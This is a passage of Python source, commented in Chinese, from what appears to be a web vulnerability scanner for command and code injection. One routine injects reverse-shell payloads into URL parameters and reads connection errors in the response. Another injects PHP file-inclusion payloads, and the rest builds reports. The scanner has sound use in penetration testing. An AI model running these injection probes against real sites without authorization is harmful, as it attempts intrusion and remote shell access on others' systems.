        for payload_info in self.command_payloads.get("reverse_shell", [])[:3]:
            payload = payload_info["payload"]
            os_type = payload_info["os"]
            separator = payload_info["separator"]
            
            try:
                test_value = f"{param_value}{payload}"
                response = self._send_command_test(url, param_name, test_value, method, post_data)
                
                if response:
                    # 反向shell通常不会有直接响应，但可以检查是否有异常行为
                    content = response['response'].get('content', '')
                    if not isinstance(content, str):
                        content = str(content)
                    
                    # 检查是否有连接相关的错误
                    error_indicators = [
                        "Connection refused",
                        "Connection timed out",
                        "No route to host",
                        "Network is unreachable"
                    ]
                    
                    for indicator in error_indicators:
                        if indicator in content:
                            vulnerabilities.append({
                                'type': 'Command Injection (Reverse Shell Attempt)',
                                'payload': payload,
                                'os': os_type,
                                'confidence': '中',
                                'evidence': f"反向Shell尝试: {indicator}",
                                'technique': 'Reverse shell connection',
                                'separator': separator,
                                'response_code': response['response'].get('status_code', 0)
                            })
                            break
            
            except Exception:
                continue
        
        return vulnerabilities

    def detect_file_inclusion(self, url, param_name, param_value, method, post_data):
        """文件包含检测"""
        vulnerabilities = []
        
        for payload_info in self.code_payloads.get("php_include", [])[:3]:
            payload = payload_info["payload"]
            language = payload_info["language"]
            context = payload_info["context"]
            
            try:
                test_value = f"{param_value}{payload}"
                response = self._send_code_test(url, param_name, test_value, method, post_data)
                
                if response:
                    content = response['response'].get('content', '')
                    if not isinstance(content, str):
                        content = str(content)
                    
                    # 检查文件包含的常见错误
                    include_indicators = [
                        "failed to open stream",
                        "No such file or directory",
                        "include_path",
                        "require_once",
                        "Failed opening"
                    ]
                    
                    for indicator in include_indicators:
                        if indicator.lower() in content.lower():
                            vulnerabilities.append({
                                'type': 'File Inclusion',
                                'payload': payload,
                                'language': language,
                                'confidence': '中',
                                'evidence': f"文件包含错误: {indicator}",
                                'technique': 'File include/require',
                                'context': context,
                                'response_code': response['response'].get('status_code', 0)
                            })
                            break
            
            except Exception:
                continue
        
        return vulnerabilities

    def _format_command_vulnerability(self, detection_result, url, param_name, method):
        """格式化命令执行漏洞结果"""
        if isinstance(detection_result, dict):
            vuln = detection_result.copy()
            vuln['url'] = url
            
            if 'parameter' not in vuln and param_name:
                vuln['parameter'] = param_name
            
            if 'method' not in vuln:
                vuln['method'] = method
            
            if 'type' not in vuln:
                vuln['type'] = 'Command Injection'
            
            if 'confidence' not in vuln:
                vuln['confidence'] = '中'
            
            return vuln
        else:
            return {
                'url': url,
                'type': 'Command Injection',
                'parameter': param_name or 'unknown',
                'method': method,
                'confidence': '中',
                'description': str(detection_result)
            }

    def _format_code_vulnerability(self, detection_result, url, param_name, method):
        """格式化代码执行漏洞结果"""
        if isinstance(detection_result, dict):
            vuln = detection_result.copy()
            vuln['url'] = url
            
            if 'parameter' not in vuln and param_name:
                vuln['parameter'] = param_name
            
            if 'method' not in vuln:
                vuln['method'] = method
            
            if 'type' not in vuln:
                vuln['type'] = 'Code Injection'
            
            if 'confidence' not in vuln:
                vuln['confidence'] = '中'
            
            return vuln
        else:
            return {
                'url': url,
                'type': 'Code Injection',
                'parameter': param_name or 'unknown',
                'method': method,
                'confidence': '中',
                'description': str(detection_result)
            }

    def update_command_statistics(self, vulnerabilities):
        """更新命令执行统计信息"""
        stats = self.results['command_statistics']
        
        if not vulnerabilities:
            return
        
        unique_urls = set()
        for vuln in vulnerabilities:
            if 'url' in vuln:
                unique_urls.add(vuln['url'])
            elif 'tested_url' in vuln:
                unique_urls.add(vuln['tested_url'])
        
        stats["total_tested"] = len(unique_urls)
        stats["vulnerable_urls"] = len(unique_urls)
        
        for vuln in vulnerabilities:
            vuln_type = vuln["type"].split("(")[-1].split(")")[0] if "(" in vuln["type"] else vuln["type"]
            stats["by_type"][vuln_type] = stats["by_type"].get(vuln_type, 0) + 1
            
            os_type = vuln.get("os", "unknown")
            stats["by_os"][os_type] = stats["by_os"].get(os_type, 0) + 1
            
            method = vuln.get("method", "unknown")
            stats["by_method"][method] = stats["by_method"].get(method, 0) + 1

    def update_code_statistics(self, vulnerabilities):
        """更新代码执行统计信息"""
        stats = self.results['code_statistics']
        
        if not vulnerabilities:
            return
        
        unique_urls = set()
        for vuln in vulnerabilities:
            if 'url' in vuln:
                unique_urls.add(vuln['url'])
            elif 'tested_url' in vuln:
                unique_urls.add(vuln['tested_url'])
        
        stats["total_tested"] = len(unique_urls)
        stats["vulnerable_urls"] = len(unique_urls)
        
        for vuln in vulnerabilities:
            vuln_type = vuln["type"].split("(")[-1].split(")")[0] if "(" in vuln["type"] else vuln["type"]
            stats["by_type"][vuln_type] = stats["by_type"].get(vuln_type, 0) + 1
            
            language = vuln.get("language", "unknown")
            stats["by_language"][language] = stats["by_language"].get(language, 0) + 1
            
            method = vuln.get("method", "unknown")
            stats["by_method"][method] = stats["by_method"].get(method, 0) + 1

    def evaluate_command_results(self, vulnerabilities):
        """评估命令执行检测结果"""
        if not vulnerabilities:
            return {
                'vulnerable': False,
                'confidence': '无',
                'summary': '未检测到命令注入漏洞'
            }
        
        confidence_map = {'高': 3, '中': 2, '低': 1}
        
        total_weight = 0
        total_confidence = 0
        
        for vuln in vulnerabilities:
            weight = confidence_map.get(vuln.get('confidence', '低'), 1)
            total_weight += weight
            total_confidence += weight * confidence_map.get(vuln['confidence'], 1)
        
        avg_confidence = total_confidence / total_weight if total_weight > 0 else 0
        
        if avg_confidence >= 2.5:
            verdict = '确认存在漏洞'
            confidence = '高'
        elif avg_confidence >= 1.5:
            verdict = '很可能存在漏洞'
            confidence = '中'
        else:
            verdict = '可能存在漏洞'
            confidence = '低'
        
        vuln_types = set(r['type'] for r in vulnerabilities)
        
        return {
            'vulnerable': True,
            'confidence': confidence,
            'verdict': verdict,
            'detected_types': list(vuln_types),
            'total_findings': len(vulnerabilities),
            'details': vulnerabilities
        }

    def evaluate_code_results(self, vulnerabilities):
        """评估代码执行检测结果"""
        if not vulnerabilities:
            return {
                'vulnerable': False,
                'confidence': '无',
                'summary': '未检测到代码注入漏洞'
            }
        
        confidence_map = {'高': 3, '中': 2, '低': 1}
        
        total_weight = 0
        total_confidence = 0
        
        for vuln in vulnerabilities:
            weight = confidence_map.get(vuln.get('confidence', '低'), 1)
            total_weight += weight
            total_confidence += weight * confidence_map.get(vuln['confidence'], 1)
        
        avg_confidence = total_confidence / total_weight if total_weight > 0 else 0
        
        if avg_confidence >= 2.5:
            verdict = '确认存在漏洞'
            confidence = '高'
        elif avg_confidence >= 1.5:
            verdict = '很可能存在漏洞'
            confidence = '中'
        else:
            verdict = '可能存在漏洞'
            confidence = '低'
        
        vuln_types = set(r['type'] for r in vulnerabilities)
        
        return {
            'vulnerable': True,
            'confidence': confidence,
            'verdict': verdict,
            'detected_types': list(vuln_types),
            'total_findings': len(vulnerabilities),
            'details': vulnerabilities
        }

    def scan_all_vulnerabilities(self, url, param_name=None, param_value=None, method="GET", post_data=None):
        """
        扫描所有漏洞类型（命令执行 + 代码执行）
        """
        print_colored(f"\n{'='*60}","yellow")
        print_colored(f"\n🔍 开始全面的命令注入和代码执行漏洞扫描: {url}","red")
        print_colored(f"\n{'='*60}","yellow")
        
        all_vulnerabilities = []
        
        # 扫描命令注入
        cmd_results, _ = self.check_command_injection(url, param_name, param_value, method, post_data)
        all_vulnerabilities.extend(cmd_results)
        
        # 扫描代码注入
        code_results, _ = self.check_code_injection(url, param_name, param_value, method, post_data)
        all_vulnerabilities.extend(code_results)
        
        # 生成报告
        print(f"\n{'='*60}")
        print(f"扫描完成！")
        print(f"总共发现漏洞: {len(all_vulnerabilities)}")
        print(f"命令注入漏洞: {len(cmd_results)}")
        print(f"代码注入漏洞: {len(code_results)}")
        
        if all_vulnerabilities:
            print(f"\n漏洞汇总:")
            for i, vuln in enumerate(all_vulnerabilities, 1):
                print(f"{i}. [{vuln['type']}] {vuln.get('url', 'N/A')}")
                print(f"   参数: {vuln.get('parameter', 'N/A')} | 方法: {vuln.get('method', 'N/A')}")
                print(f"   可信度: {vuln.get('confidence', 'N/A')}")
                if 'evidence' in vuln:
                    if isinstance(vuln['evidence'], dict):
                        print(f"   证据: {list(vuln['evidence'].keys())}")
                    else:
                        print(f"   证据: {vuln['evidence'][:100]}...")
                print()
        
        return all_vulnerabilities, self.results

# ==================== 使用示例 ====================
if __name__ == "__main__":
    scanner = CommandCodeScanner()
    
    # 测试URL示例
    test_urls = [
        "http://www.sqli-labs.com/Less-1",
        #"http://testphp.vulnweb.com/categories.php?cat=1"
    ]
    
    for url in test_urls:
        print(f"\n{'='*60}")
        print(f"开始扫描: {url}")
        
        # 扫描命令注入
        cmd_vulns, cmd_results = scanner.check_command_injection(url, "id", "1")
        
        # 扫描代码注入
        code_vulns, code_results = scanner.check_code_injection(url, "id", "1")
        
        if not cmd_vulns and not code_vulns:
            print(f"未发现命令执行或代码执行漏洞")
        else:
            print(f"发现 {len(cmd_vulns) + len(code_vulns)} 个漏洞")